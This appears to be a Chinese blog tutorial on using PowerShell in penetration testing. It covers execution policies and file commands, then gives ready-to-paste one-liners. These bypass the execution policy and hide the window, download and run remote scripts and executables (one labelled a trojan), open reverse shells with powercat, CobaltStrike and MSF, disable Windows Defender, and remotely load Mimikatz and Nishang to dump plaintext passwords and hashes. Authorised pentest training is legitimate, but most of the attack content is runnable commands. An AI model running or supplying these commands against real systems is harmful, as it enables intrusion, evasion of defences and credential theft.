**目录**

[Windows PowerShell](#t0 "Windows PowerShell")

[PowerShell的执行策略](#t1 "PowerShell的执行策略")

[绕过执行策略执行PowerShell脚本](#t2 "绕过执行策略执行PowerShell脚本")

[PowerShell的常用文件类命令](#t3 "PowerShell的常用文件类命令")

[PowerShell远程下载文件并执行](#t4 "PowerShell远程下载文件并执行")

[渗透测试常用的PowerShell命令](#t5 "渗透测试常用的PowerShell命令")

[Powershell导入文件](#t6 "Powershell导入文件 ") 

* * *

Windows PowerShell
------------------

Windows [PowerShell](https://so.csdn.net/so/search?q=PowerShell&spm=1001.2101.3001.7020)是一种命令行外壳程序和脚本环境，它内置在Windows7及其以上的系统中，使命令行用户和脚本编写者可以利用.NET Framework的强大功能。PowerShell无须写到磁盘中，它可以直接在内存中运行。

各操作系统的PowerShell版本

| 操作系统 | PowerShell版本 |
| --- | --- |
| Windows7、Windows Server2008 | 2.0 |
| Windows8、Windows Server2012 | 3.0 |
| Windows8.1、Windows Server2012 R2 | 4.0 |
| Windows10、Windows Server2016 | 5.0 |

一个PowerShell脚本其实就是一个简单的文本文件，这个文件包含了一系列的PowerShell命令，每个命令显示为独立的一行，PowerShell文件的后缀为.ps1。

在64位的Windows操作系统中，存在两个版本的PowerShell，一个是x64版本的，一个是x86版本的。这两个版本的执行策略不会互相影响，可以把它们看成是两个独立的程序。x64版本PowerShell的配置文件在   C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0 目录下。Powershell包含两个应用程序组件：基于文本的标准控制台(powershell.exe) 和 集成了[命令行](https://so.csdn.net/so/search?q=%E5%91%BD%E4%BB%A4%E8%A1%8C&spm=1001.2101.3001.7020)环境的图形化界面(ISE：powershell\_ise.exe)。

注：Server服务器默认不自带powershell\_ise.exe，要想安装ISE，打开powershell控制台，运行：Add-WindowsFeaturePowerShell-ise 。

![](https://img-blog.csdnimg.cn/20210104090736174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20210104092753912.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**PowerShell的优点**

*   Windows7以上的操作系统默认安装
*   PowerShell无须写到磁盘中，它可以直接在内存中运行。
*   可以从另外一个系统中下载PowerShell脚本并执行
*   很多杀毒软件检测不到PowerShell的活动
*   cmd通常会被杀毒软件阻止运行，而PowerShell不会
*   PowerShell可以用来管理活动目录

**查看PowerShell版本**

*   Winxp/WinServer2003      默认没有powershell
*   Win7/WinServer2008        默认装有2.0版本的powershell
*   Win8.1/WinServer2012     默认装有4.0版本的powershell
*   Win10/WinServer2016      默认装有5.0版本的powershell

```
Get-Host        
或者        
$PSVersionTable.PSVERSION
```


![](https://img-blog.csdnimg.cn/20191201145154304.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**PowerShell的简单使用**

可以执行 ctrl+R ，输入PowerShell 调出PowerShell，也可以在cmd下输入powershell进入，还可以在cmd下输入powershell命令，但是在每条命令之前加上powershell help查看PowerShell的帮助。

![](https://img-blog.csdnimg.cn/20191201145238429.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### PowerShell的执行策略

为防止恶意脚本的执行，PowerShell有一个执行策略，默认情况下，这个执行策略被设置为受限。

我们可以使用：Get-ExecutionPolicy  命令查看PowerShell当前的执行策略。它有4个策略。

*   Restricted：脚本不能运行(默认设置)
*   RemoteSigned：本地创建的脚本可以运行，但是从网上下载的脚本不能运行(拥有数字证书签名的除外)
*   AllSigned：仅当脚本由受信任的发布者签名时才能运行
*   Unrestricted：允许所有的脚本执行

可以看到，我们PowerShell脚本当前的执行策略是 AllSigned。

![](https://img-blog.csdnimg.cn/20191201145322563.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**修改PowerShell执行策略：**

```
Set-ExecutionPolicy 策略名       #该命令需要管理员权限运行
```


![](https://img-blog.csdnimg.cn/20191112082315427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 绕过执行策略执行PowerShell脚本

在[渗透测试](https://so.csdn.net/so/search?q=%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95&spm=1001.2101.3001.7020)时，需要采用一些方法绕过策略来执行PowerShell脚本：

**下载远程PowerShell脚本绕过权限执行**

经过测试，在cmd窗口执行远程下载的powershell脚本，不论当前策略，都可以直接运行。而powershell窗口不行。

```
#cmd窗口执行以下命令      
powershell -c IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.10.11/test.ps1')      
在powershell窗口执行      
IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.10.11/test.ps1')
```


![](https://img-blog.csdnimg.cn/20191117214545105.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**绕过本地权限执行**

上传test.ps1到目标主机，在cmd环境下，在目标主机本地当前目录执行该脚本

```
powershell -exec bypass  .\test.ps1
```


![](https://img-blog.csdnimg.cn/20191117214217843.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**本地隐藏绕过权限执行脚本**

```
powershell.exe -exec bypass -W hidden -nop  test.ps1
```


*   ExecvtionPolicy Bypass（-exec bypass）：绕过执行安全策略，这个参数非常重要，在默认情况下，PowerShell的安全策略规定了PoweShell不允许运行命令和文件。通过设置这个参数，可以绕过任意一个安全保护规则
*   WindowStyle Hidden(-w hidden)：隐藏窗口，也就是执行完命令后，窗口隐藏
*   \-command(-c)：执行powershell脚本
*   NoProfile(-nop)：PowerShell控制台不加载当前用户的配置文件
*   NoLogo：启动不显示版权标志的PowerShell
*   Nonlnteractive(-noni)：非交互模式
*   Noexit：执行后不退出shell，这在使用键盘记录等脚本时非常重要 
*   \-enc  base64： 把ps脚本编码成base64来执行，实战用的最多

### PowerShell的常用文件类命令

在PowerShell下，命令的命名规范很一致，都采用了动词-名词的形式，如Net-Item，动词一般为Add、New、Get、Remove、Set等。PoerShell还兼容cmd和Linux命令，如查看目录可以使用 dir 或者 ls 。

**文件操作类的PowerShell命令**

```
新建目录test：New-Item test -ItemType directory      
删除目录test：Remove-Item test      
新建文件test.txt：New-Item test.txt -ItemType file      
新建文件test.txt，内容为 hello：New-Item test.txt -ItemType file -value "hello"      
删除文件test.txt：Remove-Item test.txt      
查看文件test.txt内容：Get-Content  test.txt      
设置文件test.txt内容t：Set-Content  test.txt  -Value "haha"      
给文件test.txt追加内容：Add-Content test.txt  -Value ",word!"      
清除文件test.txt内容：Clear-Content test.txt
```


![](https://img-blog.csdnimg.cn/20191112093541565.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### **PowerShell远程下载文件并执行**

**cmd窗口下载文件**

管理员权限才可以下载到C盘目录下，普通权限不能下在到C盘下。DownloadFile函数必须提供两个参数

```
#下载文件到指定目录      
powershell (new-object system.net.webclient).downloadfile('http://192.168.10.11/test.exe','d:/test.exe');       
#下载文件到当前目录      
powershell (new-object system.net.webclient).downloadfile('http://192.168.10.11/test.exe','test.exe');
```


![](https://img-blog.csdnimg.cn/2019111722062867.png)

**cmd窗口下载文件并执行(exe)**

远程下载木马文件并执行

```
powershell (new-object system.net.webclient).downloadfile('http://192.168.10.11/test.exe','test.exe');start-process test.exe
```


**cmd窗口下载文件并执行(powershell脚本)** 

远程下载 test.ps1 脚本，直接执行，该命令可以绕过powershell的执行策略。

```
powershell -c IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.10.11/test.ps1')
```


![](https://img-blog.csdnimg.cn/20191117161140975.png)

**远程下载 powercat.ps1 脚本，并带参数运行，该命令可以绕过powershell的执行策略**

```
powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 192.168.10.11 -p 8888 -e cmd
```


### ![](https://img-blog.csdnimg.cn/20191117215321326.png)

### 渗透测试常用的PowerShell命令

**关闭Windows自带的Defender防火墙(需要管理员权限)**

```
powershell Set-MpPreference -disablerealtimeMonitoring $true
```


**在cmd窗口下执行，将远程主机上的test.exe 下载到本地的D盘下**

```
powershell (new-object system.net.webclient).downloadfile('http://192.168.10.11/test.exe','d:/test.exe');
```


**cmd窗口下利用Powershell反弹NC shell**  

```
在cmd窗口执行      
powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 192.168.10.11 -p 8888 -e cmd      
在powershell窗口执行      
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 192.168.10.11 -p 8888 -e cmd
```


**cmd窗口下利用Powershell反弹CobaltStrike shell** 

```
在cmd窗口执行      
powershell.exe -c IEX ((new-object net.webclient).downloadstring('http://xx.xx.xx.xx/a'))        
在powershell窗口执行      
IEX ((new-object net.webclient).downloadstring('http://xx.xx.xx.xx/a'))
```


**cmd窗口下利用Powershell反弹MSF shell** 

```
在cmd窗口执行      
powershell -c IEX (New-Object Net.WebClient).DownloadString('http://xx.xx.xx.xx/7788.ps1');xx.ps1      
在powershell窗口执行      
IEX (New-Object Net.WebClient).DownloadString('http://xx.xx.xx.xx/7788.ps1');xx.ps1
```


**远程加载PowerShell脚本读取明文密码**

需要管理员权限

```
在cmd窗口执行      
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz –DumpCerts      
在powershell窗口执行      
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz –DumpCerts
```


 **远程加载PowerShell脚本读取密码hash值**

需要管理员权限

```
在cmd窗口执行      
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1');Get-PassHashes      
在powershell窗口执行      
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1');Get-PassHashes
```


### Powershell导入文件 

在大型的Powershell项目下，通常会有 .ps1 、.psd1 和 .psm1 几种后缀的文件。如PowerSploit工具

![](https://img-blog.csdnimg.cn/20191217161342877.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

下面说下这几种后缀文件的用法。

*   .ps1 文件就是PowerShell脚本文件，该文件内容就是powershell语法
*   .psd1 文件是这个模块的介绍
*   .psm1 是模块文件

对于 .psm1 和 psd1 文件，可以使用以下命令进行导入

```
 Import-Module .\PowerSploit.psm1      
 Import-Module .\PowerSploit.psd1
```


然后输入命令：Get-Command -Module PowerSploit 查看导入的模块都有哪些功能

![](https://img-blog.csdnimg.cn/2019121715520711.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20191217155243866.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

对于.ps1文件，既可以使用  Import-Module 也可以使用 . 进行导入

```
Import-Module .\Get-Information.ps1      
. .\Get-Information.ps1
```


![](https://img-blog.csdnimg.cn/20191217160033646.png)

![](https://img-blog.csdnimg.cn/20191217160007127.png)

  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)

参考书籍：[《Web安全攻防-渗透测试实战指南》](https://item.jd.com/12401707.html "《Web安全攻防-渗透测试实战指南》")

相关文章：[PowerSploit收集域信息](https://blog.csdn.net/qq_36119192/article/details/103103880 "PowerSploit收集域信息")

                  [一些值得收藏的PowerShell工具](https://www.freebuf.com/sectool/87647.html "一些值得收藏的PowerShell工具")